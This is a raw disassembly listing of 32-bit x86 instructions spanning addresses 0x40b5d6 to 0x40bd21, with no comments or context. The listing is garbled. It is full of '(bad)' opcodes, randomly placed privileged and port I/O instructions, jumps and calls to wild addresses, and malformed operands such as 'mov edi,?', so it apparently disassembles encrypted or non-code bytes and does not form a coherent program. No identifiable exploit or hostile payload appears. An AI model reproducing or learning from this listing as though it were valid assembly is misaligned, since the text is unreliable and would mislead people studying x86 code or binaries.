  40b5d6:	shl    DWORD PTR [ebx],1
  40b5d8:	mov    dh,0x84
  40b5da:	fnsave ds:0x354256ae
  40b5e0:	(bad)  
  40b5e1:	xor    al,0x63
  40b5e3:	repz test DWORD PTR [edi-0xa76c359],esp
  40b5ea:	lods   eax,DWORD PTR ds:[esi]
  40b5eb:	jae    0x40b610
  40b5ed:	out    dx,al
  40b5ee:	adc    edx,edx
  40b5f0:	fadd   DWORD PTR [eax-0x38]
  40b5f3:	xchg   esi,eax
  40b5f4:	sbb    eax,0x65658526
  40b5f9:	jecxz  0x40b580
  40b5fb:	rcl    BYTE PTR [eax+0x56],0xff
  40b5ff:	nop
  40b600:	out    0x54,eax
  40b602:	xchg   ecx,eax
  40b603:	mov    edi,?
  40b605:	push   edi
  40b606:	inc    eax
  40b607:	jl     0x40b64e
  40b609:	jmp    0x94b:0x7de9cb7e
  40b610:	pop    ebx
  40b611:	mov    eax,edx
  40b613:	fild   WORD PTR [ecx+0x76]
  40b616:	fst    DWORD PTR ds:0xb0bf337c
  40b61c:	push   cs
  40b61d:	pop    ebx
  40b61e:	xchg   esi,eax
  40b61f:	(bad)  
  40b620:	mov    dh,0x43
  40b622:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b623:	shl    ch,cl
  40b625:	xchg   edx,esp
  40b627:	cmp    BYTE PTR ds:0xe14db15f,al
  40b62d:	mov    ecx,0x218c7746
  40b632:	call   DWORD PTR [ebx]
  40b634:	lods   al,BYTE PTR ds:[si]
  40b636:	xlat   BYTE PTR ds:[ebx]
  40b637:	adc    al,0x6b
  40b639:	outs   dx,BYTE PTR ds:[esi]
  40b63a:	pop    esi
  40b63b:	inc    esi
  40b63c:	mul    cl
  40b63e:	jp     0x40b5c1
  40b640:	pop    es
  40b641:	rcr    DWORD PTR [ebp+ebp*8+0x5a],cl
  40b645:	add    BYTE PTR [edx+0x62],0xf7
  40b649:	jecxz  0x40b643
  40b64b:	in     eax,dx
  40b64c:	mov    ebx,0x8f50645c
  40b651:	xor    DWORD PTR ds:0x5beffa06,esi
  40b657:	scas   eax,DWORD PTR es:[edi]
  40b658:	jne    0x40b69b
  40b65a:	xadd   DWORD PTR [ebx],esi
  40b65d:	aaa    
  40b65e:	ret    0xaede
  40b661:	add    ebp,0xf3473ad7
  40b667:	mov    DWORD PTR [edx+0x6d],esi
  40b66a:	lahf   
  40b66b:	fwait
  40b66c:	(bad)  
  40b66d:	and    DWORD PTR [eax],esp
  40b66f:	pop    ebp
  40b670:	jmp    0x40b63f
  40b672:	stos   DWORD PTR es:[edi],eax
  40b673:	lock fwait
  40b675:	sbb    eax,DWORD PTR [ecx+ebp*2]
  40b678:	and    al,0xa0
  40b67a:	into   
  40b67b:	inc    eax
  40b67c:	outs   dx,DWORD PTR ds:[esi]
  40b67d:	mov    DWORD PTR [eax],esp
  40b67f:	fs call 0xa9f31f46
  40b685:	int3   
  40b686:	lods   eax,DWORD PTR ds:[esi]
  40b687:	fld    QWORD PTR [esi+0x3d038a01]
  40b68d:	push   cs
  40b68e:	test   DWORD PTR [esi+edx*8+0x38],ebp
  40b692:	pop    eax
  40b693:	dec    ebx
  40b694:	add    DWORD PTR [ebx],ebp
  40b696:	sbb    DWORD PTR [edx],ecx
  40b698:	add    DWORD PTR [ebx-0x2c7217f],edi
  40b69e:	jno    0x40b6df
  40b6a0:	imul   edi,DWORD PTR [edi],0xffffffdc
  40b6a3:	or     eax,0xa399b0b
  40b6a8:	cmp    al,0xa6
  40b6aa:	xchg   edx,eax
  40b6ab:	inc    esp
  40b6ac:	push   ebp
  40b6ad:	mov    dl,0x86
  40b6af:	sahf   
  40b6b0:	pop    es
  40b6b1:	fnstsw WORD PTR [ebx]
  40b6b3:	jge    0x40b665
  40b6b5:	pop    esi
  40b6b6:	es aaa 
  40b6b8:	sar    ebx,1
  40b6ba:	(bad)  
  40b6bb:	pop    eax
  40b6bc:	adc    eax,0x261bb6f7
  40b6c1:	jo     0x40b679
  40b6c3:	add    eax,0x55896f7d
  40b6c8:	push   ss
  40b6c9:	push   edi
  40b6cb:	dec    esp
  40b6cc:	pop    ecx
  40b6cd:	dec    esi
  40b6ce:	shl    DWORD PTR [eax],0x59
  40b6d1:	mov    esi,0xfc44b1f5
  40b6d6:	ret    0xae86
  40b6d9:	xchg   esp,eax
  40b6da:	dec    ebx
  40b6db:	inc    ebx
  40b6dc:	aam    0xe0
  40b6de:	dec    ebx
  40b6df:	addr16 std 
  40b6e1:	push   edi
  40b6e2:	pop    ds
  40b6e3:	fcom   QWORD PTR [edi+0x14486e2f]
  40b6e9:	or     DWORD PTR [ebp+0x6de0943],ebx
  40b6ef:	fst    st(4)
  40b6f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b6f2:	push   esp
  40b6f3:	xchg   ebx,eax
  40b6f4:	jb     0x40b750
  40b6f6:	jno    0x40b747
  40b6f8:	mov    dl,0x45
  40b6fa:	loop   0x40b67d
  40b6fc:	adc    BYTE PTR [ebp-0xf2afa85],dh
  40b702:	cdq    
  40b703:	xchg   cl,cl
  40b705:	clc    
  40b706:	add    BYTE PTR [esp+ebp*1+0x3fd85b9a],ah
  40b70d:	xchg   DWORD PTR [ebp+0x75c6de05],ebp
  40b713:	nop
  40b714:	add    al,0xb
  40b716:	xor    eax,0x95b54f15
  40b71b:	mov    eax,ds:0x7c24a1da
  40b720:	(bad)  
  40b721:	ficomp WORD PTR [esi-0x18]
  40b724:	enter  0x3d82,0x53
  40b728:	adc    al,0x69
  40b72a:	idiv   DWORD PTR [edi+0x7b9776fd]
  40b730:	loope  0x40b725
  40b732:	ja     0x40b6c9
  40b734:	dec    esp
  40b735:	pushf  
  40b736:	xchg   BYTE PTR [eax+0x76a94414],bl
  40b73c:	xlat   BYTE PTR ds:[ebx]
  40b73d:	test   al,0x29
  40b73f:	jae    0x40b759
  40b741:	mov    ecx,0x17f6a59c
  40b746:	dec    esi
  40b747:	jmp    0x6f702868
  40b74c:	push   ecx
  40b74d:	pop    ebx
  40b74e:	inc    esp
  40b74f:	or     cl,ch
  40b751:	(bad)  
  40b752:	ror    ebx,cl
  40b754:	or     DWORD PTR [edx],esi
  40b756:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b757:	les    edx,FWORD PTR [edi-0x3f]
  40b75a:	rep stos DWORD PTR es:[edi],eax
  40b75c:	sysexit 
  40b75e:	rcr    BYTE PTR [esi-0x45471ab2],1
  40b764:	sbb    DWORD PTR [esi],edi
  40b766:	shl    DWORD PTR [esi-0x587687c5],1
  40b76c:	call   0x6c62294b
  40b771:	fild   QWORD PTR [esi-0x70]
  40b774:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b775:	mov    esp,0xb1b28d7e
  40b77a:	push   ss
  40b77b:	pusha  
  40b77c:	in     al,dx
  40b77d:	inc    ecx
  40b77e:	mov    esi,0x94e2fff6
  40b783:	mov    bh,0xb3
  40b785:	fidiv  DWORD PTR [esi+0x48]
  40b788:	pop    esp
  40b789:	mov    ebp,0x901a7889
  40b78e:	xchg   DWORD PTR ds:0x373bb0f5,ecx
  40b794:	lods   eax,DWORD PTR cs:[esi]
  40b796:	stos   BYTE PTR es:[edi],al
  40b797:	test   ecx,edi
  40b799:	xor    ebx,DWORD PTR [edx-0x74bce533]
  40b79f:	idiv   DWORD PTR [edx]
  40b7a1:	jl     0x40b815
  40b7a3:	sub    esp,DWORD PTR [edx+0x7c]
  40b7a6:	rcl    BYTE PTR [edi+0x23],1
  40b7a9:	push   ebp
  40b7aa:	or     edx,DWORD PTR [edx+0x5e]
  40b7ad:	out    dx,eax
  40b7ae:	add    BYTE PTR [ecx],ch
  40b7b0:	loopne 0x40b7a4
  40b7b2:	mov    ds:0x47a5c53c,al
  40b7b7:	mov    ax,0xdeeb
  40b7bb:	retf   0x20c1
  40b7be:	inc    ebx
  40b7bf:	sbb    al,0xb1
  40b7c1:	add    eax,0xf5611b4
  40b7c6:	dec    edx
  40b7c7:	dec    eax
  40b7c8:	out    0x79,eax
  40b7ca:	jecxz  0x40b7ac
  40b7cc:	es scas al,BYTE PTR es:[edi]
  40b7ce:	outs   dx,BYTE PTR ds:[esi]
  40b7cf:	repz pop esi
  40b7d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b7d2:	mov    ah,0x29
  40b7d4:	adc    bh,BYTE PTR [edx+edi*8+0x50]
  40b7d8:	shl    DWORD PTR [eax-0x19f30969],cl
  40b7de:	nop
  40b7df:	xor    BYTE PTR [ecx+ebx*4-0x66acb95a],0xa4
  40b7e7:	leave  
  40b7e8:	sbb    eax,0x4c132132
  40b7ed:	pop    ss
  40b7ee:	sti    
  40b7ef:	daa    
  40b7f0:	mov    ebp,0x39a88476
  40b7f5:	fist   DWORD PTR [esi]
  40b7f7:	jo     0x40b803
  40b7f9:	arpl   WORD PTR ds:0xece34211,si
  40b7ff:	call   DWORD PTR [edi]
  40b802:	inc    edx
  40b803:	xchg   esp,eax
  40b804:	xchg   esi,eax
  40b805:	ror    BYTE PTR [ebx-0x70],cl
  40b808:	jmp    0x6d98567d
  40b80d:	call   0xc52ddae2
  40b812:	shr    BYTE PTR [di],0xda
  40b816:	jno    0x40b86f
  40b818:	and    al,0xbc
  40b81a:	sub    al,0x0
  40b81c:	inc    esp
  40b81d:	arpl   WORD PTR [edx],si
  40b81f:	scas   eax,DWORD PTR es:[edi]
  40b820:	dec    ebp
  40b821:	and    BYTE PTR [edi-0x5475faaf],0x11
  40b828:	xchg   BYTE PTR [eax+0x8],al
  40b82b:	lds    ebx,FWORD PTR [ecx]
  40b82d:	out    0x83,al
  40b82f:	sbb    ecx,DWORD PTR [ebx]
  40b831:	fidiv  DWORD PTR [esp+esi*2]
  40b834:	out    0x55,al
  40b836:	(bad)  
  40b837:	sbb    esi,DWORD PTR [esi]
  40b839:	pop    edx
  40b83a:	inc    eax
  40b83b:	mov    eax,0xd98d6843
  40b840:	add    BYTE PTR [ecx],cl
  40b842:	retf   0x8a98
  40b845:	adc    eax,0x602a6ed0
  40b84a:	cmp    eax,0x4ad87ac
  40b84f:	ficom  WORD PTR [esi-0x54]
  40b852:	idiv   BYTE PTR [esi]
  40b854:	div    BYTE PTR [edx+0x2]
  40b857:	sbb    al,0x83
  40b859:	push   esi
  40b85a:	scas   eax,DWORD PTR es:[edi]
  40b85b:	dec    eax
  40b85c:	mov    ebx,0xb955852f
  40b861:	mov    al,al
  40b863:	outs   dx,DWORD PTR ds:[esi]
  40b864:	gs mov ebx,0x97f27892
  40b86a:	adc    al,0x76
  40b86c:	(bad)  
  40b86d:	pop    esi
  40b86e:	mov    al,0xed
  40b870:	inc    ecx
  40b871:	popa   
  40b872:	ret    
  40b873:	stc    
  40b874:	or     DWORD PTR [ecx-0x5ed79bea],edi
  40b87a:	(bad)  [ebx+0xb694dfb]
  40b880:	dec    ebx
  40b881:	xchg   ebx,eax
  40b882:	arpl   WORD PTR [edx+0x58],bp
  40b885:	enter  0x2026,0xcf
  40b889:	in     al,dx
  40b88a:	out    0x2e,eax
  40b88c:	mov    al,0x4d
  40b88e:	pop    edx
  40b88f:	rcl    ecx,1
  40b891:	(bad)  
  40b892:	aad    0xad
  40b894:	inc    eax
  40b895:	inc    ebp
  40b896:	dec    edx
  40b897:	pop    es
  40b898:	inc    eax
  40b899:	mov    ebp,0x67185629
  40b89e:	pop    edx
  40b89f:	and    al,0x5f
  40b8a1:	gs push esi
  40b8a3:	xchg   esp,eax
  40b8a4:	jne    0x40b920
  40b8a6:	ja     0x40b8d2
  40b8a8:	lea    edi,[ecx+0x7b]
  40b8ab:	shr    DWORD PTR [eax+0x2ace1fa9],0x12
  40b8b2:	adc    al,0x8c
  40b8b4:	loop   0x40b83f
  40b8b6:	aas    
  40b8b7:	jmp    0x40b888
  40b8b9:	mov    ecx,0x32824afb
  40b8be:	pop    ebx
  40b8bf:	cwde   
  40b8c0:	bound  edx,QWORD PTR [ecx+0x6]
  40b8c3:	arpl   WORD PTR [edi],dx
  40b8c5:	mov    ah,0x13
  40b8c7:	cmp    BYTE PTR [ecx],bl
  40b8c9:	or     BYTE PTR [ecx+eiz*8+0x2652022c],dl
  40b8d0:	mov    ecx,0x12db1468
  40b8d5:	test   DWORD PTR [esi-0x7],0x73690459
  40b8dc:	call   0x61ece363
  40b8e1:	(bad)  
  40b8e3:	dec    ecx
  40b8e4:	xor    esi,DWORD PTR [ebp+0x3e]
  40b8e7:	pop    es
  40b8e8:	retf   
  40b8e9:	aad    0x3a
  40b8eb:	call   0xe3bf4391
  40b8f0:	aam    0x4c
  40b8f2:	and    BYTE PTR [ebp-0x68],ch
  40b8f5:	cmp    al,0x9b
  40b8f7:	push   ebp
  40b8f8:	shr    DWORD PTR [edi-0xe2d916c],cl
  40b8fe:	enter  0xc244,0xd1
  40b902:	sbb    ebx,DWORD PTR [ebx-0x4c]
  40b905:	jmp    0x2e22:0xa6288e36
  40b90c:	xchg   ebx,eax
  40b90d:	push   edx
  40b90e:	dec    edx
  40b90f:	ins    BYTE PTR es:[edi],dx
  40b910:	xor    eax,0x7ad6fc39
  40b915:	jnp    0x40b8cd
  40b917:	jae    0x40b913
  40b919:	xchg   ecx,eax
  40b91a:	xlat   BYTE PTR ds:[ebx]
  40b91b:	xor    cl,cl
  40b91d:	mov    ds:0x8433994a,al
  40b922:	aam    0x52
  40b924:	sbb    BYTE PTR [edx],cl
  40b926:	mov    edx,0x361fb5e1
  40b92b:	xchg   ebp,eax
  40b92c:	pop    ecx
  40b92d:	loop   0x40b935
  40b92f:	arpl   bp,dx
  40b931:	push   edi
  40b932:	push   cs
  40b933:	push   ecx
  40b934:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b935:	std    
  40b936:	je     0x40b8d7
  40b938:	(bad)  
  40b939:	std    
  40b93a:	into   
  40b93b:	inc    edi
  40b93c:	xor    BYTE PTR [edi-0x42c3e148],bh
  40b942:	jge    0x40b94d
  40b944:	js     0x40b8e4
  40b946:	inc    ecx
  40b947:	cmp    al,0xdf
  40b949:	inc    eax
  40b94a:	das    
  40b94b:	fist   DWORD PTR [eax+0x47]
  40b94e:	sbb    eax,0x17aa4d81
  40b953:	hlt    
  40b954:	pop    es
  40b955:	mov    ch,0xb6
  40b957:	mov    al,0x67
  40b959:	xchg   esp,eax
  40b95a:	sar    BYTE PTR [esi+0x48],0x1a
  40b95e:	and    eax,0x8b567cf0
  40b963:	dec    esi
  40b964:	pop    edx
  40b965:	mov    cl,0x36
  40b967:	cmp    eax,0xe9aa9ab
  40b96c:	call   DWORD PTR [eax+ebp*4]
  40b96f:	push   ebp
  40b970:	or     eax,esp
  40b972:	loope  0x40b9e3
  40b974:	rcl    BYTE PTR [edi-0x4b],0xe7
  40b978:	fidivr DWORD PTR ds:0xb616e1f4
  40b97e:	or     DWORD PTR [ecx-0x72],ebx
  40b981:	js     0x40b97f
  40b983:	dec    edx
  40b984:	mov    edx,0x421c7189
  40b989:	pop    edi
  40b98a:	pushw  es
  40b98c:	cmp    eax,0xe72b9dc7
  40b991:	shr    DWORD PTR [ebx],0xcf
  40b994:	pop    es
  40b995:	mov    bh,0x71
  40b997:	les    ecx,FWORD PTR [edi+0x45]
  40b99a:	or     BYTE PTR [ebp-0x157b3fff],cl
  40b9a0:	stc    
  40b9a1:	mov    edi,0xa271cad4
  40b9a6:	mov    ds:0x7e098910,al
  40b9ab:	daa    
  40b9ac:	xchg   BYTE PTR [esi-0x2c],bl
  40b9af:	add    ah,BYTE PTR [ecx+0x9d8f16f]
  40b9b5:	mov    esp,0x19dbafc8
  40b9ba:	dec    edx
  40b9bb:	popa   
  40b9bc:	or     esp,DWORD PTR [eax]
  40b9be:	ficomp DWORD PTR [ebx+0x74a6f871]
  40b9c4:	push   cs
  40b9c5:	xchg   edx,eax
  40b9c6:	mov    bh,0xe9
  40b9c8:	sub    BYTE PTR [edx+0x3e1c973d],0xcd
  40b9cf:	inc    ebx
  40b9d0:	jl     0x40b9a2
  40b9d2:	inc    ecx
  40b9d3:	and    ch,BYTE PTR [edi-0x48acfaf]
  40b9d9:	mov    edx,DWORD PTR [ebx]
  40b9db:	add    al,0x1
  40b9dd:	cmp    edx,DWORD PTR ds:0x9fff8ac5
  40b9e3:	xchg   edi,eax
  40b9e4:	pop    edx
  40b9e5:	scas   al,BYTE PTR es:[edi]
  40b9e6:	jmp    0x3f356917
  40b9eb:	repnz and bl,dh
  40b9ee:	aam    0x70
  40b9f0:	sbb    edi,DWORD PTR [esi]
  40b9f2:	mov    edi,0xb1dad826
  40b9f7:	mov    esi,0x9224bd6e
  40b9fc:	outs   dx,DWORD PTR ds:[esi]
  40b9fd:	mov    esi,0x39e58ce1
  40ba02:	jmp    0x105d:0x4a6a2a87
  40ba09:	addr16 push ebx
  40ba0b:	xor    BYTE PTR [ebp+0x58ec816],bh
  40ba11:	stos   DWORD PTR es:[edi],eax
  40ba12:	and    al,0x8c
  40ba14:	add    eax,0xabdb621e
  40ba19:	mov    eax,0xe1b1c31a
  40ba1e:	or     edx,DWORD PTR [ebx-0x492ab09e]
  40ba24:	add    BYTE PTR [esi+eiz*2+0x54],0xde
  40ba29:	xor    cl,ch
  40ba2b:	xchg   edx,eax
  40ba2c:	pop    edi
  40ba2d:	mov    ebx,0x918dad77
  40ba32:	push   edx
  40ba33:	(bad)
  40ba38:	mov    fs,WORD PTR [ebp+ebp*8-0x79]
  40ba3c:	icebp  
  40ba3d:	xlat   BYTE PTR ds:[ebx]
  40ba3e:	test   eax,0xb577eaee
  40ba43:	push   es
  40ba44:	pop    ebx
  40ba45:	dec    edx
  40ba46:	ret    
  40ba47:	sub    ah,BYTE PTR [edx]
  40ba49:	jnp    0x40bab7
  40ba4b:	dec    ecx
  40ba4c:	pop    ss
  40ba4d:	test   eax,0x19858fdd
  40ba52:	int3   
  40ba53:	or     al,0x22
  40ba55:	fisttp WORD PTR [edx-0x414da57e]
  40ba5b:	jno    0x40b9f5
  40ba5d:	inc    esi
  40ba5e:	xchg   DWORD PTR [eax+0x5f],esp
  40ba61:	and    cl,BYTE PTR [ebp+eiz*4-0x67a71c92]
  40ba68:	out    0x34,al
  40ba6a:	retf   
  40ba6b:	(bad)  
  40ba6c:	(bad)  [ebp+0x5c37cc8e]
  40ba72:	test   BYTE PTR [ecx+0x7f],bl
  40ba75:	lock daa 
  40ba77:	adc    esi,DWORD PTR [edx+0x2c0456c2]
  40ba7d:	cwde   
  40ba7e:	push   eax
  40ba7f:	mov    ch,0x8b
  40ba81:	bound  ebx,QWORD PTR [ebp-0x280ed67]
  40ba87:	cwde   
  40ba88:	push   0xe0e46dea
  40ba8d:	cs fstp st(3)
  40ba90:	push   ss
  40ba91:	mov    WORD PTR [edi*1-0x691e0d96],cs
  40ba98:	(bad)  
  40ba99:	jns    0x40bb12
  40ba9b:	pop    esp
  40ba9c:	out    0x81,al
  40ba9e:	cmp    ecx,DWORD PTR [ebx+0x43]
  40baa1:	or     bl,BYTE PTR [edi-0x48]
  40baa4:	cli    
  40baa5:	test   DWORD PTR [ecx+0x1e],esp
  40baa8:	or     al,0xaf
  40baaa:	stos   BYTE PTR es:[edi],al
  40baab:	xchg   ecx,eax
  40baac:	inc    esi
  40baad:	pusha  
  40baae:	out    dx,al
  40baaf:	mov    ds:0x1daeece6,al
  40bab4:	cld    
  40bab5:	es ins BYTE PTR es:[edi],dx
  40bab7:	inc    ebp
  40bab8:	sub    BYTE PTR [edx+eiz*2],bh
  40babb:	cmp    ch,BYTE PTR [ebx]
  40babd:	pushf  
  40babe:	sub    dh,BYTE PTR cs:[ecx+0x6a]
  40bac2:	pop    esp
  40bac3:	stc    
  40bac4:	push   edx
  40bac5:	nop
  40bac6:	in     eax,0xc0
  40bac8:	lods   al,BYTE PTR ds:[esi]
  40bac9:	arpl   WORD PTR [edx+0x17fecbf],cx
  40bacf:	pop    ds
  40bad0:	dec    BYTE PTR [eax+0x7d]
  40bad3:	mov    ebp,0x26cf7965
  40bad8:	icebp  
  40bad9:	push   0xb3b61093
  40bade:	and    esp,esi
  40bae0:	pop    ecx
  40bae1:	out    dx,al
  40bae2:	popa   
  40bae3:	popf   
  40bae4:	mov    dh,0xf8
  40bae6:	std    
  40bae7:	mov    al,ds:0x703c5f77
  40baec:	add    DWORD PTR ds:0xe95e7c3b,edi
  40baf2:	mov    al,ds:0xe76e31ed
  40baf7:	xor    DWORD PTR [edi-0x69],edx
  40bafa:	push   es
  40bafb:	loop   0x40bb41
  40bafd:	push   0xb
  40baff:	clc    
  40bb00:	in     al,0x1f
  40bb02:	dec    esi
  40bb03:	out    dx,eax
  40bb04:	scas   al,BYTE PTR es:[edi]
  40bb05:	shr    DWORD PTR [edi+edi*8],cl
  40bb08:	aad    0xb
  40bb0a:	mov    eax,ds:0xd1f00398
  40bb0f:	into   
  40bb10:	jmp    0x40ba92
  40bb12:	and    ebx,eax
  40bb14:	popf   
  40bb15:	jle    0x40bb52
  40bb17:	int    0xe7
  40bb19:	iret   
  40bb1a:	ins    BYTE PTR es:[edi],dx
  40bb1b:	jl     0x40bb37
  40bb1d:	xchg   esp,eax
  40bb1e:	mov    ds:0xaf1af72d,eax
  40bb23:	loop   0x40bb4e
  40bb25:	jb     0x40bba3
  40bb27:	lock gs stos DWORD PTR es:[edi],eax
  40bb2a:	mov    ds:0x64b38f2c,eax
  40bb2f:	pusha  
  40bb30:	cli    
  40bb31:	mov    bh,0x73
  40bb33:	gs jae 0x40bb7b
  40bb36:	out    0x1,al
  40bb38:	dec    esi
  40bb39:	push   0x97eb2397
  40bb3e:	jmp    0x40bbb7
  40bb40:	and    eax,0xaa857fa7
  40bb45:	out    dx,al
  40bb46:	mov    ah,BYTE PTR [ecx+0x5bda5b99]
  40bb4c:	in     eax,0x4e
  40bb4e:	dec    ebp
  40bb4f:	popf   
  40bb50:	neg    bl
  40bb52:	sub    al,0xcf
  40bb54:	mov    cl,0xc6
  40bb56:	je     0x40bb20
  40bb58:	push   ecx
  40bb59:	cmp    ebx,ecx
  40bb5b:	imul   ebp,DWORD PTR [ecx+edx*1+0x24],0xffffffd6
  40bb60:	mov    ecx,0xc77aca6d
  40bb65:	(bad)  
  40bb66:	mov    eax,ds:0x24d9cf5f
  40bb6b:	scas   eax,DWORD PTR es:[edi]
  40bb6c:	mov    bh,0xf9
  40bb6e:	repnz in al,dx
  40bb70:	xchg   ebx,eax
  40bb71:	cmp    al,0x25
  40bb73:	adc    cl,BYTE PTR [eax-0x128f5ec2]
  40bb79:	addr16 iret 
  40bb7b:	jmp    0x40bb67
  40bb7d:	mov    ?,ebp
  40bb7f:	test   al,0xf7
  40bb81:	push   ecx
  40bb82:	fdivr  QWORD PTR [ecx+0x5d]
  40bb85:	les    edi,FWORD PTR [esi+0x33]
  40bb88:	(bad)  
  40bb89:	jb     0x40bbab
  40bb8b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bb8c:	jmp    0x40bb55
  40bb8e:	xchg   ebp,eax
  40bb8f:	repz push ss
  40bb91:	nop
  40bb92:	push   ecx
  40bb93:	clc    
  40bb94:	and    DWORD PTR [esi],0x2b375b5b
  40bb9a:	in     eax,0x6
  40bb9c:	sbb    ah,BYTE PTR [ecx]
  40bb9e:	mov    esp,0xb093d561
  40bba3:	test   BYTE PTR [edx-0x2cd9693f],ah
  40bba9:	hlt    
  40bbaa:	pop    ebp
  40bbab:	adc    dl,bl
  40bbad:	stos   BYTE PTR es:[edi],al
  40bbae:	jle    0x40bbec
  40bbb0:	stos   DWORD PTR es:[edi],eax
  40bbb1:	mov    esi,0xe4abd81a
  40bbb6:	adc    al,0xaa
  40bbb8:	inc    edi
  40bbb9:	dec    edx
  40bbba:	nop
  40bbbb:	mov    DWORD PTR [ebx],esi
  40bbbd:	pop    edx
  40bbbe:	ins    BYTE PTR es:[edi],dx
  40bbbf:	xchg   ebp,eax
  40bbc0:	sub    dh,BYTE PTR [ecx+0x6c7274e2]
  40bbc6:	adc    BYTE PTR [ecx+0x2a],ah
  40bbc9:	ds ret 
  40bbcb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bbcc:	sbb    al,0xdd
  40bbce:	inc    ebp
  40bbcf:	and    DWORD PTR [edi],edx
  40bbd1:	pop    edx
  40bbd2:	mov    edx,0x4f188f2a
  40bbd7:	cld    
  40bbd8:	or     DWORD PTR [esi+0x45],esp
  40bbdb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bbdc:	gs gs daa 
  40bbdf:	adc    BYTE PTR [eax+eax*2+0x3f655d26],al
  40bbe6:	sbb    DWORD PTR [ebx-0x4bdc9d5e],esi
  40bbec:	jmp    0x40bb70
  40bbee:	pusha  
  40bbef:	inc    ecx
  40bbf0:	fmul   DWORD PTR [ebx-0x702ed852]
  40bbf6:	or     DWORD PTR [edi],ecx
  40bbf8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bbf9:	int    0x19
  40bbfb:	push   ds
  40bbfc:	cmp    eax,0xf2c2703c
  40bc01:	jle    0x40bbeb
  40bc03:	retf   
  40bc04:	idiv   esi
  40bc06:	jo     0x40bb8f
  40bc08:	mov    esi,0x29bd5893
  40bc0d:	ins    DWORD PTR es:[edi],dx
  40bc0e:	adc    eax,0x3591572f
  40bc13:	pop    ebx
  40bc14:	dec    ecx
  40bc15:	mov    edx,0xe95829bb
  40bc1a:	pushf  
  40bc1b:	fcmove st,st(6)
  40bc1d:	retf   0x89e
  40bc20:	into   
  40bc21:	out    0xe8,al
  40bc23:	and    eax,0x6360f2e3
  40bc28:	out    0x8e,al
  40bc2a:	dec    edi
  40bc2b:	mov    bh,BYTE PTR [eax]
  40bc2d:	test   eax,0x8461db4e
  40bc32:	out    0x1a,eax
  40bc34:	push   edi
  40bc35:	or     eax,0x5927d76b
  40bc3a:	sbb    al,0xa6
  40bc3c:	leave  
  40bc3d:	adc    dh,BYTE PTR [eax+0x6f]
  40bc40:	xor    eax,0x837b3613
  40bc45:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bc46:	arpl   WORD PTR [esi+0x54],bx
  40bc49:	adc    dl,BYTE PTR [edi]
  40bc4b:	and    al,BYTE PTR [edi+0x36eb2060]
  40bc51:	das    
  40bc52:	jmp    0x40bc2b
  40bc54:	add    al,BYTE PTR [ecx-0x605fff80]
  40bc5a:	retf   
  40bc5b:	mov    bh,0xae
  40bc5d:	add    DWORD PTR [ebp+eiz*2-0x67],edx
  40bc61:	pusha  
  40bc62:	xlat   BYTE PTR ds:[ebx]
  40bc63:	jmp    0x40bc95
  40bc65:	mov    ah,0x6b
  40bc67:	push   eax
  40bc68:	add    DWORD PTR [ecx+0x7],esi
  40bc6b:	test   eax,0xe7724ac1
  40bc70:	sub    al,0xe
  40bc72:	sbb    eax,0x45f949d3
  40bc77:	clc    
  40bc78:	ins    BYTE PTR es:[edi],dx
  40bc79:	jge    0x40bcd0
  40bc7b:	dec    esp
  40bc7c:	or     BYTE PTR [esi+0x26584183],dh
  40bc82:	lods   al,BYTE PTR ds:[esi]
  40bc83:	pop    es
  40bc84:	scas   al,BYTE PTR es:[edi]
  40bc85:	out    dx,al
  40bc86:	leave  
  40bc87:	xchg   esp,eax
  40bc88:	mov    fs,ecx
  40bc8a:	popf   
  40bc8b:	das    
  40bc8c:	push   edx
  40bc8d:	mov    esi,DWORD PTR [ebx+0x33d192cc]
  40bc93:	xchg   esp,eax
  40bc94:	fucomip st,st(6)
  40bc96:	mov    DWORD PTR [esp+ebx*1+0x4deb7c9e],esi
  40bc9d:	ret    0x435e
  40bca0:	ffree  st(0)
  40bca2:	inc    esi
  40bca3:	xor    al,0x5a
  40bca5:	sub    edx,DWORD PTR [esi-0xeb5edb9]
  40bcab:	push   cs
  40bcac:	dec    eax
  40bcad:	xchg   ebp,eax
  40bcae:	push   esi
  40bcaf:	xchg   ecx,eax
  40bcb0:	(bad)  
  40bcb1:	xor    al,0x19
  40bcb3:	and    DWORD PTR [ebx+0x78],ebp
  40bcb6:	lock push edi
  40bcb8:	addr16 inc edi
  40bcba:	jge    0x40bd1e
  40bcbc:	mov    edi,0xa95b4e97
  40bcc1:	gs mov bh,bl
  40bcc4:	adc    esp,DWORD PTR [ebx+0x66a044d6]
  40bcca:	pop    ds
  40bccb:	call   0x6fc258
  40bcd0:	cs dec edi
  40bcd2:	(bad)  [eax+ebp*4-0x4]
  40bcd6:	jno    0x40bcf5
  40bcd8:	adc    BYTE PTR [edx+eiz*8-0x2a],dl
  40bcdc:	mov    ecx,0x6b0353c5
  40bce1:	fimul  DWORD PTR [ecx]
  40bce3:	call   0xa31:0xa2e16b8a
  40bcea:	rcl    ebx,cl
  40bcec:	popa   
  40bced:	sbb    ah,BYTE PTR [edx+0x5]
  40bcf0:	bound  ebx,QWORD PTR [eax-0x72]
  40bcf3:	lods   eax,DWORD PTR ds:[esi]
  40bcf4:	aaa    
  40bcf5:	xchg   esi,eax
  40bcf6:	int3   
  40bcf7:	dec    ecx
  40bcf8:	rol    BYTE PTR [ecx+0x1],cl
  40bcfb:	xchg   edx,eax
  40bcfc:	cmp    al,0x9c
  40bcfe:	xor    DWORD PTR [edx+0x6],esp
  40bd01:	das    
  40bd02:	pop    ecx
  40bd03:	jle    0x40bd22
  40bd05:	cmp    DWORD PTR [esp+esi*1-0x7558d7b],0x1f8942e4
  40bd10:	in     eax,dx
  40bd11:	scas   eax,DWORD PTR es:[edi]
  40bd12:	mov    ds:0x1e65ba0a,al
  40bd17:	int    0xe3
  40bd19:	rcr    BYTE PTR [edi+0x72a8fb72],0xf4
  40bd20:	stos   BYTE PTR es:[edi],al
  40bd21:	js     0x40bd11
